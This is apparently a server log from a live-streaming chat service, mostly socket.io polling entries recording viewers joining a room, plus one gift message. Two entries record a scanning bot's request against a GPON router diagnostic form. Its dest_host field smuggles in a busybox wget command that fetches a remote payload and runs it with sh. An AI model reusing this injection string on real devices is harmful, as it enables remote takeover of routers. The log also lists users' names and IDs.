[2021-04-19 10:11:25.127] [INFO] - [ 'jQcsw3VxH3_6suvaADBf', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:12:08.042] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e5488922aaef4393a3a8781a14bb96bf',
  username: '筝弘ZHU',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdvZXk' }
[2021-04-19 10:12:08.044] [INFO] - [ '7LOIJfJAAT7gQzF4ADBg', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:12:11.046] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdvaFu' }
[2021-04-19 10:12:11.047] [INFO] - [ 'ux5oOEJ6GVaVI9McADBh', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:12:55.491] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdvl6G' }
[2021-04-19 10:12:55.491] [INFO] - [ 'Ck_551dDnab1A-q_ADBi', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:13:37.904] [INFO] - gift { role: 0,
  _id: 'TXvZe-gUx1ke4hD3ADBc',
  msg: '666',
  num: 1,
  img: 'https://culturecloud-live.oss-cn-shanghai.aliyuncs.com/gift/666.gif' }
[2021-04-19 10:14:08.741] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '66bc44bb3e074eb8a4f6602d2215cd44',
  username: '赵琴官',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdw1NJ' }
[2021-04-19 10:14:08.741] [INFO] - [ '3es-9XO1cAzjv3zxADBj', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:14:11.553] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdw1rM' }
[2021-04-19 10:14:11.553] [INFO] - [ 'ro2IJwmLxXqtD1QOADBk', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:14:16.013] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdw2mD' }
[2021-04-19 10:14:16.013] [INFO] - [ 'oWKwFxR4fnPEpZXTADBl', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:14:51.530] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdwBTp' }
[2021-04-19 10:14:51.530] [INFO] - [ '6xrpZNP8qLS3pHc_ADBm', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:15:15.990] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0a08a50acd4c4028bde3ad8c51bae37b',
  username: '徐胜环老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdwHPu' }
[2021-04-19 10:15:15.991] [INFO] - [ 'LBvmZ-pSnhR45LsqADBn', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:15:38.229] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdwMo2' }
[2021-04-19 10:15:38.230] [INFO] - [ '8XV58TuKknNPmSAGADBo', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:16:29.294] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0a08a50acd4c4028bde3ad8c51bae37b',
  username: '徐胜环老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdwZJ2' }
[2021-04-19 10:16:29.295] [INFO] - [ '7l5Xzf2ehh-B9vNoADBp', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:16:49.683] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '62413c658ee547b5be67a601452e81cc',
  username: '王乾隆',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdwepl' }
[2021-04-19 10:16:49.683] [INFO] - [ 'vVSMM1RCrOkzZRAXADBq', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:16:57.241] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '22a90c7470d342f6b14632c460872423',
  username: 'jenny _zyq',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdwgCL' }
[2021-04-19 10:16:57.241] [INFO] - [ '-7s7mS550acosvkhADBr', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:17:02.519] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '62413c658ee547b5be67a601452e81cc',
  username: '王乾隆',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdwhyX' }
[2021-04-19 10:17:02.520] [INFO] - [ '6sl5XPqnbplzfheGADBs', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:17:06.775] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '62413c658ee547b5be67a601452e81cc',
  username: '王乾隆',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdwi-r' }
[2021-04-19 10:17:06.776] [INFO] - [ 'rwpDDildPm5jt7GEADBt', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:18:36.519] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'eac849041b9b4b699e2f425726328c27',
  username: '红儿',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdx2Lx' }
[2021-04-19 10:18:36.519] [INFO] - [ '9AsxwYY0kcW9PswWADBu', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:18:39.863] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdx3Cv' }
[2021-04-19 10:18:39.863] [INFO] - [ '22dq8cEBgTKNwOV7ADBv', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:18:49.521] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'eac849041b9b4b699e2f425726328c27',
  username: '红儿',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdx5X5' }
[2021-04-19 10:18:49.522] [INFO] - [ '_8rvyta68N7ly4FIADBw', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:20:08.006] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 1ms
[2021-04-19 10:20:15.495] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdxQZA' }
[2021-04-19 10:20:15.495] [INFO] - [ '4GyXXe6k-SLfU0_eADBx', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:20:38.017] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdxW36' }
[2021-04-19 10:20:38.017] [INFO] - [ 'S-8Z4MvBwGVYCerVADBy', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:20:53.237] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdxZmK' }
[2021-04-19 10:20:53.237] [INFO] - [ 'RrbOf0NS9rcSzlOZADBz', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:21:21.262] [INFO] - [127.0.0.1] POST http://127.0.0.1:8250/GponForm/diag_Form?style/ "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.249.33.79/cache+-O+->+/dev/.p;sh+/dev/.p)&ipv=0\r\n" 405 0ms
[2021-04-19 10:21:25.769] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '9b855dbdc43e42568f732442efdbb7e6',
  username: '金火官',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdxib2' }
[2021-04-19 10:21:25.770] [INFO] - [ 'e96DiPrHYXcVb5HFADB0', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:22:01.233] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8ee7acc0de544cf3b026faa91bc7fef3',
  username: '闭眼茉莉安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdxqOJ' }
[2021-04-19 10:22:01.234] [INFO] - [ 'rfeqyDcsQGEKZsE8ADB1', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:22:17.860] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdxuM7' }
[2021-04-19 10:22:17.860] [INFO] - [ 'xP_ly-SyhegKyWxTADB2', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:22:42.364] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdxzsz' }
[2021-04-19 10:22:42.364] [INFO] - [ 'IFb9rP7u1HZd3I3VADB3', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:23:00.405] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'de043791b63a4aed8a69b8bb6a6c54af',
  username: '海晨',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdy2pk' }
[2021-04-19 10:23:00.405] [INFO] - [ '0CwM9ZuLEs62Ppj7ADB4', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:23:10.652] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e620fc9f652a45d582708aae961f7d3e',
  username: '余浩',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdy5Kv' }
[2021-04-19 10:23:10.653] [INFO] - [ 'NAzOW60a3srps6GoADB5', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:23:35.554] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '4aa9d734982b44e4973bbb40dce41945',
  username: 'ivy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdyBXy' }
[2021-04-19 10:23:35.555] [INFO] - [ 'aa63DSffWDmezq_UADB6', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:23:38.555] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8ee7acc0de544cf3b026faa91bc7fef3',
  username: '闭眼茉莉安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdyC8j' }
[2021-04-19 10:23:38.555] [INFO] - [ '2gKOSl9zVUw3sOgRADB7', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:24:01.298] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '4aa9d734982b44e4973bbb40dce41945',
  username: 'ivy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdyHpz' }
[2021-04-19 10:24:01.298] [INFO] - [ 'Lo1PT91HU1pRTCkNADB8', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:24:05.676] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '4aa9d734982b44e4973bbb40dce41945',
  username: 'ivy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdyIv8' }
[2021-04-19 10:24:05.678] [INFO] - [ 'srwo2-W57OML2ERqADB9', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:24:17.694] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e5488922aaef4393a3a8781a14bb96bf',
  username: '筝弘ZHU',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdyLgq' }
[2021-04-19 10:24:17.694] [INFO] - [ 'mMCBfMKX4YnHOCIpADB-', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:25:36.242] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '31986c97c79e49d7ae45eb14fe86ab77',
  username: '施敬泽',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdyesd' }
[2021-04-19 10:25:36.242] [INFO] - [ 'hozJK1s0wJS5jx1UADB_', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:25:49.067] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0a08a50acd4c4028bde3ad8c51bae37b',
  username: '徐胜环老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdyhzW' }
[2021-04-19 10:25:49.068] [INFO] - [ 'lqwkNQos4jJ7z4dnADCA', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:26:04.050] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ReportServer 200 1ms
[2021-04-19 10:26:34.724] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdytGu' }
[2021-04-19 10:26:34.724] [INFO] - [ '-Z0ifxKYO7qfx26rADCB', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:27:10.883] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdy_zf' }
[2021-04-19 10:27:10.884] [INFO] - [ '0C-TLnu25pnvMZLYADCC', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:28:09.176] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ReportServer 200 1ms
[2021-04-19 10:28:40.910] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdzLwQ' }
[2021-04-19 10:28:40.911] [INFO] - [ 'f6Ky7Rh6uSRTS0lMADCD', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:28:46.300] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0a08a50acd4c4028bde3ad8c51bae37b',
  username: '徐胜环老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdzNEr' }
[2021-04-19 10:28:46.300] [INFO] - [ '9XQB3-khTN3q6IhsADCE', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:29:13.407] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'd51c2deec76f4b4aaeb6e6692d11fab5',
  username: '阿民',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdzTqY' }
[2021-04-19 10:29:13.408] [INFO] - [ 'pp0rdIAWIyus1OEcADCF', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:30:05.784] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8c6adc7f85a7462d9c09b8097a8ee1a7',
  username: '青青雨兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdzgg-' }
[2021-04-19 10:30:05.785] [INFO] - [ 'fa5eoVXk4EKD-e-TADCG', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:31:26.177] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '963d07c60d5e4ad0a7d1e01c109f7a86',
  username: '小扁鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZdz-IW' }
[2021-04-19 10:31:26.177] [INFO] - [ 'p4lBP9F0TB7VuRrgADCH', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:31:48.485] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd-3ik' }
[2021-04-19 10:31:48.485] [INFO] - [ 'Ay4iqT_8lSMHRlfQADCI', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:33:28.303] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b60934712c0e4c61bcdebc5c820e226c',
  username: '张hui',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd-S4z' }
[2021-04-19 10:33:28.304] [INFO] - [ 'C-gM40dnGBUqtJTUADCJ', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:34:38.940] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0fb8f08fe24444519ead0bd40daf52e4',
  username: '小玉透明',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd-jfO' }
[2021-04-19 10:34:38.940] [INFO] - [ 'E_SBqtCUbo3zJrBDADCK', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:34:46.168] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd-l7I' }
[2021-04-19 10:34:46.168] [INFO] - [ 'p_cVaB5nn33M_KvsADCL', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:34:49.354] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '4aa9d734982b44e4973bbb40dce41945',
  username: 'ivy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd-m09' }
[2021-04-19 10:34:49.354] [INFO] - [ 'XBzlEffnVeQsUKajADCM', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:34:50.684] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd-mCK' }
[2021-04-19 10:34:50.684] [INFO] - [ 'OvxGdxS29LolgV2FADCN', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:35:04.468] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b60934712c0e4c61bcdebc5c820e226c',
  username: '张hui',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd-pbc' }
[2021-04-19 10:35:04.470] [INFO] - [ 'GiTHqhJj21bxMS9jADCO', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:35:38.766] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'a3bbd9a4c7904fedbefac9da52f9638c',
  username: '卞莉莉',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd-xzx' }
[2021-04-19 10:35:38.766] [INFO] - [ 'tqun34d48-LCArHaADCP', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:37:40.619] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b60934712c0e4c61bcdebc5c820e226c',
  username: '张hui',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd_Qlp' }
[2021-04-19 10:37:40.620] [INFO] - [ 'kC_k3BD5xjOI_-GqADCQ', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:38:46.275] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'ab03c34d4e344df599506b9ca7d6bc19',
  username: '彭元海（昵称:园丁）',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd_fkp' }
[2021-04-19 10:38:46.275] [INFO] - [ '6zN3u80yN0Hid3RGADCR', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:39:05.849] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b60934712c0e4c61bcdebc5c820e226c',
  username: '张hui',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd_kUa' }
[2021-04-19 10:39:05.849] [INFO] - [ '5unGb_Zs2rpEL-wWADCS', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:39:13.862] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'b60934712c0e4c61bcdebc5c820e226c',
  username: '张hui',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd_mRG' }
[2021-04-19 10:39:13.863] [INFO] - [ 'X9yerc29deuPjANbADCT', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:39:58.171] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'd51c2deec76f4b4aaeb6e6692d11fab5',
  username: '阿民',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd_xHH' }
[2021-04-19 10:39:58.171] [INFO] - [ 'y1gaL2U18_Y2Zn83ADCU', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:40:07.521] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '0a08a50acd4c4028bde3ad8c51bae37b',
  username: '徐胜环老师',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZd_zYo' }
[2021-04-19 10:40:07.522] [INFO] - [ 'ErxtHdjlgUpLp4y5ADCV', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:40:20.906] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe00qh' }
[2021-04-19 10:40:20.906] [INFO] - [ 'CbFkInLwsenPqOlMADCW', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:40:44.291] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe06Xc' }
[2021-04-19 10:40:44.291] [INFO] - [ 'snky92a6cuqQ5Q4jADCX', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:41:06.931] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'ab03c34d4e344df599506b9ca7d6bc19',
  username: '彭元海（昵称:园丁）',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe0C4h' }
[2021-04-19 10:41:06.931] [INFO] - [ 'FfWXMSa0xgqq1v0hADCY', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:41:41.591] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8ee7acc0de544cf3b026faa91bc7fef3',
  username: '闭眼茉莉安',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe0KZi' }
[2021-04-19 10:41:41.591] [INFO] - [ 'S4FReMurMMcjye0-ADCZ', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:42:13.757] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'aa278ba4012940a89a2001c46feecd2d',
  username: '乐秀航',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe0SIj' }
[2021-04-19 10:42:13.758] [INFO] - [ '-v3owq4HuntjWAYGADCa', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:42:37.835] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '8932edf2a77d42fea74c0808f071b685',
  username: 'LAVAZZA',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe0YH1' }
[2021-04-19 10:42:37.835] [INFO] - [ 'sLHFTNYKZqcn_C9nADCb', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:43:05.446] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'aa278ba4012940a89a2001c46feecd2d',
  username: '乐秀航',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe0ez7' }
[2021-04-19 10:43:05.446] [INFO] - [ 'VcvG5RAQ4ZfwmMXdADCc', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:43:14.397] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe0hAW' }
[2021-04-19 10:43:14.397] [INFO] - [ '87434BsuN911Zj8qADCd', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:43:30.444] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe0l6H' }
[2021-04-19 10:43:30.444] [INFO] - [ '56rQQxulBS-IhRcSADCe', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:44:26.672] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe0yql' }
[2021-04-19 10:44:26.672] [INFO] - [ 'vNs15hKTxkLJ7BnoADCf', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:44:34.804] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe0-pY' }
[2021-04-19 10:44:34.804] [INFO] - [ 'mh4mLVUUzxaEmw4uADCg', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:44:48.536] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe129r' }
[2021-04-19 10:44:48.537] [INFO] - [ '9kOYI3tKpWSA3qWdADCh', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:45:22.276] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1APS' }
[2021-04-19 10:45:22.276] [INFO] - [ 'D79GwdrWNLLlcDMZADCi', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:45:23.616] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: 'e5488922aaef4393a3a8781a14bb96bf',
  username: '筝弘ZHU',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1AkC' }
[2021-04-19 10:45:23.616] [INFO] - [ 'R5pXUk1c28-ow06TADCj', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:45:45.953] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1GBO' }
[2021-04-19 10:45:45.953] [INFO] - [ '7Q0kOxNujBOAjgbKADCk', 'cc541ed7fe394c169297c95fd0c44af7' ]
[2021-04-19 10:45:59.195] [INFO] - query { rid: 'cc541ed7fe394c169297c95fd0c44af7',
  uid: '7d955879adf44904aa077cb8b0d30171',
  username: '一条鱼',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'NZe1JQ7' }
[2021-04-19 10:45:59.195] [INFO] - [ 'ub9-gZxr9y0ubdfXADCl', 'cc541ed7fe394c169297c95fd0c44af7' ]
